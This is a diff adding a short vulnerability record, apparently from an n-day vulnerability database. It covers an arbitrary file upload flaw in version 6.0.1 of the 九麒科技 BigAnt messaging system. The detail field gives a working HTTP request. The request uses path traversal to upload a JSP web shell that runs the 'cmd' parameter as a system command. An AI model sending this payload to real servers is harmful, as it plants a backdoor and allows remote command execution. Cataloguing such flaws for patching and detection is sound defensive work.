@@ -1,0 +1,14 @@
+vendor = "九麒科技"
+name = "九麒科技 BigAnt 即时通讯系统 upload_file 任意文件上传漏洞"
+type = "任意文件上传"
+path = "/upload_file"
+version = "6.0.1"
+detail = """POST /upload_file HTTP/1.1 Host: target Content-Type: multipart/form-data
+
+file_info=../webapps/ROOT/shell.jsp
+file_content=<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>"""
+fix = "升级至最新版"
+date = 20260315
+label = "nday"
+cve = "TVD-2026-05020"
+verifier = "AdySec"
